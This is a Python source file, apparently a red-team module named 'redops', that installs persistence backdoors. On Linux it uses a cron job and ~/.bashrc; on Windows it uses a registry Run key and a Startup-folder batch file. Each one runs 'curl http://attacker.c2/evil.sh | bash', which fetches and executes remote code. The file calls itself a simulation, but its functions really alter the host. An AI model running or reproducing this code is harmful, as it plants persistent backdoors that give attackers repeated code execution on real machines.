import os
import platform
import time

def persist_cron_job(payload_cmd):
    cron_line = f"*/30 * * * * {payload_cmd} # redops-persistence\n"
    cron_file = "/tmp/redops_cron.txt"

    with open(cron_file, "w") as f:
        f.write(cron_line)

    try:
        os.system(f"crontab {cron_file}")
        print(f"[+] Cron job persistence added: {cron_line.strip()}")
        return cron_line
    except Exception as e:
        print(f"[-] Cron job failed: {e}")
        return ""

def persist_bashrc(payload_cmd):
    bashrc_path = os.path.expanduser("~/.bashrc")
    try:
        with open(bashrc_path, "a") as f:
            f.write(f"\n# redops-persistence\n{payload_cmd}\n")
        print(f"[+] .bashrc persistence added: {payload_cmd}")
        return payload_cmd
    except Exception as e:
        print(f"[-] Bashrc modification failed: {e}")
        return ""

def persist_registry(payload_cmd):
    try:
        reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v RedOps /t REG_SZ /d "{payload_cmd}" /f'
        os.system(reg_cmd)
        print(f"[+] Registry autorun added: {payload_cmd}")
        return reg_cmd
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")
        return ""

def persist_startup(payload_cmd):
    try:
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        payload_path = os.path.join(startup_dir, "redops-payload.bat")
        with open(payload_path, "w") as f:
            f.write(f"@echo off\n{payload_cmd}\n")
        print(f"[+] Startup folder payload created: {payload_path}")
        return payload_path
    except Exception as e:
        print(f"[-] Startup folder persistence failed: {e}")
        return ""

def persist_backdoor(domain=None):
    print(f"\n=== Persistence Simulation on {domain or 'local host'} ===")
    system = platform.system().lower()
    output_dir = "output/"
    os.makedirs(output_dir, exist_ok=True)

    payload_cmd = "curl http://attacker.c2/evil.sh | bash"
    results = []

    if "linux" in system:
        results.append(persist_cron_job(payload_cmd))
        results.append(persist_bashrc(payload_cmd))
    elif "windows" in system:
        results.append(persist_registry(payload_cmd))
        results.append(persist_startup(payload_cmd))
    else:
        print("[-] Unsupported OS for persistence simulation.")

    # Save to file
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    with open(os.path.join(output_dir, f"{domain}_persistence.txt"), "w") as f:
        f.write("Persistence Methods Simulated:\n")
        for r in results:
            f.write(str(r) + "\n")

    print(f"[+] Persistence report saved to: {output_dir}")

# Standalone
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("domain", help="Target domain or host (for output naming)")
    args = parser.parse_args()
    persist_backdoor(args.domain)
